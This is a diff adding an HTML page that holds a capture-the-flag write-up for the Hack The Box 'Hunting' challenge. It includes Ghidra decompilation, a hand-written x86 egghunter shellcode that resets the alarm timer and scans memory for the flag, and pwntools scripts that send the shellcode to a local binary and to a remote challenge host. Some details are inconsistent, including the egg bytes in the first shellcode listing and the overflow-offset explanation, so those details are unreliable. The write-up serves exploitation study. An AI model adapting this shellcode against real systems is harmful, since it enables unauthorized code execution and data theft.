@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <script src="/index.js"></script>
+        <title>1do7 | Hack The Box: Hunting Write-up</title>
+    </head>
+    <body>
+        <div class="sidebar">
+            <a href="#wtf">WTF Is This 🤔</a>
+            <a href="#DisAss">Disassembly 🧱</a>
+            <a href="#exploit">Exploiting 😈</a>
+            <a href="#end">The End 🏁</a>
+        </div>
+        <div class = "center">
+            <h1>Hack The Box: Hunting Write-up</h1>
+            <p>I've been very fixated on web challenges lately and I tought it might be a good idea to get more into other categories a little more. I only know format string vulns and overflow vulns, which is just the basics of binary exploitation.</p>
+            <p>So today I'll be solving hunting from HTB.</p>
+            <h2 id="wtf">WTF Is This 🤔</h2>
+            <p>We have an executable file that we need to somehow exploit and get the flag we need. Let's do some basic checks using "file" and "checksec" commands.</p>
+            <img src="https://imgur.com/rzeqJKn.png">
+            <p>I reccomend you take a look at <a href="https://programmer.group/detailed-explanation-of-pwn-protection-mechanism.html">this</a>.</p>
+            <p>NX stands for No-eXecute, and is disabled on this program. This might come in handy later on.</p>
+            <p>Let's try to run the program.</p>
+            <p>We're getting a segmentation fault as soon as we enter anything?</p>
+            <img src="https://imgur.com/VnBxLa1.png">
+            <p>Let's debug more using pwntools and gdb.</p>
+            <p>Here's a python script we can use to debug this program.</p>
+            <pre><code class="language-python">
+from pwn import *
+p=process("./hunting") #Open hunting
+context.log_level="debug" #Set mode to debug
+gdb.attach(p,"c") #Open GDB for debugging
+                
+p.sendline("A"*100) #Send 100 bytes of A as input.
+p.recv() #Get response
+p.interactive() #Become interactive
+            </code></pre>
+            <p>Here's the state of registers when we run this script:</p>
+            <img src="https://imgur.com/NHFkyJS.png">
+            <p>The EAX register is filled with 60 A characters, so the BOF happens after the 40th character. NX is disabled so we might be able to read the stack/get our flag somehow.</p>
+            <h2 id="DisAss">Disassembly 🧱</h2>
+            <p>We already discorvered the buffer overflow vulnerability but we need to disassamble the code in Ghidra to get more information about what this program is actually doing, and where the flag is stored.</p>
+            <p>Here's what's going on.</p>
+            <p>FUN_0001133d:</p>
+            <pre><code class="language-C">
+void FUN_0001133d(void)
+
+{
+  int iVar1;
+  char **ppcVar2;
+  char *apcStack44 [3];
+  undefined4 uStack32;
+  undefined auStack28 [8];
+  undefined2 local_14 [2];
+  undefined *local_10;
+  
+  ppcVar2 = (char **)auStack28;
+  uStack32 = 0x1134d;
+  local_14[0] = 0xe;
+  local_10 = &DAT_00014060;
+  apcStack44[0] = (char *)0x0;
+  iVar1 = FUN_000111d0(0x26,1,0,0);
+  if (iVar1 < 0) {
+    apcStack44[0] = "prctl(PR_SET_NO_NEW_PRIVS)";
+    ppcVar2 = apcStack44;
+    FUN_00011160();
+    apcStack44[0] = (char *)0x2;
+    FUN_00011120();
+  }
+  *(undefined2 **)((int)ppcVar2 + -8) = local_14;
+  *(undefined4 *)((int)ppcVar2 + -0xc) = 2;
+  *(undefined4 *)((int)ppcVar2 + -0x10) = 0x16;
+  *(undefined4 *)((int)ppcVar2 + -0x14) = 0x113a7;
+  iVar1 = FUN_000111d0();
+  if (iVar1 < 0) {
+    *(char **)((int)ppcVar2 + -0x10) = "prctl(PR_SET_SECCOMP)";
+    *(undefined4 *)((int)ppcVar2 + -0x14) = 0x113bd;
+    FUN_00011160();
+    *(undefined4 *)((int)ppcVar2 + -0x10) = 2;
+    *(undefined4 *)((int)ppcVar2 + -0x14) = 0x113ca;
+    FUN_00011120();
+  }
+  return;
+}
+</code></pre>
+        <p>FUN_000113d0:</p>
+        <pre><code class="language-C">
+uint FUN_000113d0(void)
+
+{
+  int iVar1;
+  undefined4 local_1c [2];
+  undefined4 local_14;
+  uint local_10;
+  
+  local_14 = FUN_00011180("/dev/urandom",0);
+  FUN_00011130(local_14,local_1c,8);
+  FUN_000111f0(local_14);
+  FUN_00011190(local_1c[0]);
+  local_10 = 0;
+  while (((int)local_10 < 0x60000000 || (0xf7000000 < local_10))) {
+    iVar1 = FUN_000111e0();
+    local_10 = iVar1 << 0x10;
+  }
+  return local_10;
+}
+        </code></pre>
+        <p>FUN_00011460:</p>
+        <pre><code class="language-C">
+undefined4 FUN_00011460(void)
+
+{
+  code *pcVar1;
+  undefined4 *puVar2;
+  undefined4 uStack48;
+  code *pcStack44;
+  undefined4 local_24;
+  undefined auStack32 [4];
+  code *local_1c;
+  int local_18;
+  undefined4 local_14;
+  undefined *local_10;
+  
+  local_10 = &stack0x00000004;
+  local_24 = 0x11486;
+  local_14 = FUN_000113d0();
+  pcStack44 = exit;
+  uStack48 = 0xe;
+  FUN_00011140();
+  uStack48 = 10;
+  FUN_00011150();
+  pcStack44 = (code *)0x0;
+  uStack48 = 0xffffffff;
+  local_18 = FUN_000111a0(local_14,0x1000,3,0x31);
+  puVar2 = (undefined4 *)auStack32;
+  if (local_18 == -1) {
+    uStack48 = 0xffffffff;
+    FUN_00011120();
+    puVar2 = &uStack48;
+  }
+  *(char **)((int)puVar2 + -0xc) = s_HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX_00014020;
+  *(int *)((int)puVar2 + -0x10) = local_18;
+  *(undefined4 *)((int)puVar2 + -0x14) = 0x114eb;
+  FUN_00011170();
+  *(undefined4 *)((int)puVar2 + -8) = 0x25;
+  *(undefined4 *)((int)puVar2 + -0xc) = 0;
+  *(char **)((int)puVar2 + -0x10) = s_HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX_00014020;
+  *(undefined4 *)((int)puVar2 + -0x14) = 0x11501;
+  FUN_000111c0();
+  local_18 = 0;
+  *(undefined4 *)((int)puVar2 + -4) = 0x11510;
+  FUN_0001133d();
+  *(undefined4 *)((int)puVar2 + -0xc) = 0;
+  *(undefined4 *)((int)puVar2 + -0x10) = 0xffffffff;
+  *(undefined4 *)((int)puVar2 + -0x14) = 0x21;
+  *(undefined4 *)((int)puVar2 + -0x18) = 7;
+  *(undefined4 *)((int)puVar2 + -0x1c) = 0x1000;
+  *(undefined4 *)((int)puVar2 + -0x20) = 0;
+  *(undefined4 *)((int)puVar2 + -0x24) = 0x11527;
+  local_1c = (code *)FUN_000111a0();
+  *(undefined4 *)((int)puVar2 + -8) = 0x3c;
+  *(code **)((int)puVar2 + -0xc) = local_1c;
+  *(undefined4 *)((int)puVar2 + -0x10) = 0;
+  *(undefined4 *)((int)puVar2 + -0x14) = 0x1153c;
+  FUN_00011130();
+  *(undefined4 *)((int)puVar2 + 0xc) = 0;
+  pcVar1 = local_1c;
+  *(undefined4 *)((int)puVar2 + -4) = 0x1154c;
+  (*pcVar1)();
+  return 0;
+}
+        </code></pre>
+        <p>Explanation:</p>
+        <p>Basically FUN_000113d0 is generating a random address and FUN_00011460 is saving the placeholder flag <i>s_HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXX_00014020</i> inside that, however FUN_00011460 also has an SIGALARM signal that will go off after 3 seconds and end the program.</p>
+        <p>We need to slow down the SIGALARM, read the stack, and find our flag.</p>
+        <h2 id="exploit">Exploiting 😈</h2>
+        <p>We need to EggHunt to find our flag that starts with "<i>HTB{"</i> inside the stack. We can do that by using pwntools shellcraft.egghunter() function in python but we can only input 60 bytes as payload. We must program an Egg Hunter in Assembly that is max 60 bytes.</p>
+        <p>Let's program an egghunter in Assembly:</p>
+        <p>First of all we want to slow the SIGALARM before trying to read the stack. Let's use the alarm syscall to generate a SIGALARM signal that is long enough to read the stack in time.</p>
+        <p>You can find the syscalls inside <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit">here</a>.</p>
+        <pre><code class="console">
+section .text:
+    _start:
+        push 0x3c ;0x3c equals to 60 in decimal. Push 60 seconds inside the stack.
+        pop ebx ;set ebx register to 60 (seconds).
+        push 0x1b ;alarm syscall can be found in the link I put above this code, its the 27th system call. 27 is 0x1b in hexadecimal.
+        pop eax ;set syscall.
+        int 0x80 ;execute syscall
+        </code></pre>
+        <p>Now we can mess with the stack without worrying about the program shutting itself down.</p>
+        <p>Let's implement our egghunter code. We need to use pages since we can't straight up read the whole mfing stack. Also we need to check for EFAULT errors before doing any compairing to avoid messing with stuff.</p>
+        <pre><code class="console">
+global _start
+section .text 
+    _start:
+        push 0x3c ; 0x3c equals to 60 in decimal. Push 60 seconds inside the stack.
+        pop ebx ; set ebx register to 60 (seconds).
+        push 0x1b ; alarm syscall can be found in the link I put above this code, its the 27th system call. 27 is 0x1b in hexadecimal.
+        pop eax ; set syscall.
+        int 0x80 ; execute syscall
+        mov edi, dword 0x7b425448  ; set edi(our egg) to HTB{ in little endian, which is {BTH or 0x7b425448.
+        mov edx, 0x5FFFFFFF ; sets edx to 0x5FFFFFFF because FUN_000113d0 generates a random address ranging from 0x60000000 to 0xf7000000. We need to start searching for our egg at one address below 0x60000000, which is 0x5FFFFFFF because it just might be 0x60000000.
+    nextpage:
+        or dx, 0xfff ; set dx to 4095 because page sizes in linux is x86 or 4096.
+
+    nextaddr:
+        inc edx ; increment edx to x86
+        pusha ; push all the registers to the stack
+        xor ecx, ecx ; xor ecx by itself, resulting in cleaning ecx up. (Example: 1010 XOR 1010 = (1 XOR 1 = 0, 0 XOR 0 = 0, 1 XOR 1 = 0, 0 XOR 0 = 0) )
+        lea ebx, [edx + 0x4 ] ; address to be validated for memory violation
+        mov al, 0x21 ; access syscall
+        int 0x80 ; run syscall 
+        cmp al, 0xf2 ; catch EFAULT errors
+        popa ; get all the registers back
+        jz nextpage ; jump to next page if EFAULT occoures
+        cmp [edx], edi ; compare string to our egg which is HTB{
+        jnz nextaddr ; jump to next address if we can't find our egg
+        mov ecx, edx ; assign address of flag (buffer) to arg2 of write()
+        push 0x24 ; set the lenght of flag we're writing to 36.
+        pop edx ; set edx to 0x24 
+        push 0x1 ; stdout value
+        pop ebx ; set ebx to stdout
+        mov al, 0x4 ; write al(our flag) by using write syscall
+        int 0x80 ; execute  
+    </code></pre>
+    <p>We have prepared our exploit, lets convert it to shellcode and exploit the application. This might've not worked if NX was not disabled.</p>
+    <pre><code class="console">
+nasm -f elf32 ./payload.asm && ld -m elf_i386 payload.o -o payload
+objdump -d ./payload|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'    
+    </code></pre>
+    <p>Running these commands we can make this payload: </p>
+    <pre><code class="console">\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x54\x48\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80</code></pre>
+</code></pre>
+    <p>Let's test our script before connecting to our targets web socket.</p>
+    <pre><code class="python">
+from pwn import *
+
+app=ELF("./hunting")
+proc=app.process()
+        
+proc.send(b"\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80")
+        
+a=proc.recv()
+print(str(a))
+    </code></pre>
+    <p>Running this script returns <i>b'HTB{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}'</i></p>
+    <h2 id="end">The End 🏁</h2>
+    <p>Let's make another script but this time lets connect to our target.</p>
+    <pre><code class="python">
+from pwn import *
+proc=remote("178.62.23.240",31536)
+        
+proc.send(b"\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80")
+        
+a=proc.recv()
+print(str(a))
+    </code></pre>
+    <p>And we have successfully solved the challenge!</p>
+    <img src="https://imgur.com/8mOBh4f.png">
+    </div>
+    </body>
+</html>
